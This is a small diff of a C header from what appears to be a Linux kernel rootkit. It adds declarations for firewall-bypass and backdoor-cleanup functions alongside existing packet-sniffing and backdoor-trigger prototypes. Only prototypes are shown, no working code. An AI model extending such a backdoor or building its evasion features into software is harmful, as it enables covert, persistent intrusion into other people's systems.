@@ -124,10 +124,12 @@ struct kernel_syscalls *kv_kall_load_addr(void);
 
 /** socket,networking,backdoor management */
 struct task_struct *kv_sock_start_sniff(const char *name);
+bool kv_sock_start_fw_bypass(void);
 void kv_sock_stop_sniff(struct task_struct *tsk);
+void kv_sock_stop_fw_bypass(void);
 bool kv_bd_search_iph_source(__be32 saddr);
-bool kv_bd_search_iph_dst(__be32 daddr);
 bool kv_check_cursing(struct tcphdr *);
+void kv_bd_cleanup_item(__be32 *);
 
 /** proc handling */
 int kv_add_proc_interface(void);
